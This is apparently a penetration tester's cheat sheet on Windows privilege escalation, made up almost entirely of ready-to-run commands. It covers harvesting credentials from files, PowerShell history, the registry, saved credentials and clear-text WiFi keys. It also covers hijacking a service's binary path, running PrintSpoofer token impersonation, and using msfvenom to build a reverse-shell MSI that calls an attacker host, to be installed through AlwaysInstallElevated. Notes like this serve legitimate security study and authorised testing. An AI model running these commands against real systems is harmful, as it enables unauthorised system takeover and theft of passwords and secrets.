---
tags:
  - Foundational
  - Privilege_Escalation
  - Windows
---

# Microsoft Windows

## Windows Privilege Escalation
resources: [HackTricks - Windows Privilege Escalation](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html)

> [!info] First step after initial foothold. Gather system info, user context, and potential attack vectors.

### Current User Info
```cmd
whoami
whoami /priv
whoami /groups
```

### System Information
```cmd
systeminfo
hostname
```

### Network Information
```cmd
ipconfig /all
route print
netstat -ano
```

### Users and Groups
```cmd
net user
net user <Username>
net localgroup
net localgroup administrators
```

### Running Processes
```cmd
tasklist /SVC
```

```powershell
Get-Process
```

### Sensitive Information Discovery

#### Search for Passwords in Files
```cmd
findstr /si password *.txt *.ini *.config *.xml
```

#### PowerShell History
```powershell
Get-History
(Get-PSReadlineOption).HistorySavePath
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

#### Saved Credentials
```cmd
cmdkey /list
```

#### Registry Autologon
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

#### WiFi Passwords
```cmd
netsh wlan show profiles
netsh wlan show profile <SSID> key=clear
```

### Automated Enumeration Tools

#### WinPEAS
```cmd
winpeas.exe
```

#### PowerUp
```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

#### Seatbelt
```cmd
Seatbelt.exe -group=all
```

### Service Exploitation

> [!tip] Misconfigured services are a common privilege escalation vector.

#### List Services
```cmd
sc query state=all
```

```powershell
Get-Service
```

#### Service Binary Permissions
> [!tip] Check if current user can modify service executable.

```cmd
icacls "<ServiceBinaryPath>"
```

#### Unquoted Service Path
> [!tip] If path contains spaces and isn't quoted, Windows searches each directory.

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
```

#### Modify Service Binary Path
```cmd
sc config <ServiceName> binpath="C:\path\to\payload.exe"
sc stop <ServiceName>
sc start <ServiceName>
```

#### Restart Service
```cmd
net stop <ServiceName>
net start <ServiceName>
```

#### Scheduled Tasks
```cmd
schtasks /query /fo LIST /v
```

### Privilege Abuse

> [!info] Exploit enabled privileges and misconfigurations.

#### Token Impersonation (SeImpersonatePrivilege)
> [!tip] If enabled, can impersonate tokens. Use **PrintSpoofer**, **JuicyPotato**, or similar.

#### Check Privileges
```cmd
whoami /priv
```

#### PrintSpoofer
```cmd
PrintSpoofer.exe -i -c "cmd.exe"
```

#### AlwaysInstallElevated
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

#### Generate MSI Payload
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f msi > shell.msi
```

#### Execute MSI
```cmd
msiexec /quiet /qn /i shell.msi
```

#### Kernel Exploits
```cmd
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

#### Search Exploit-DB
```bash
searchsploit windows local privilege escalation
```
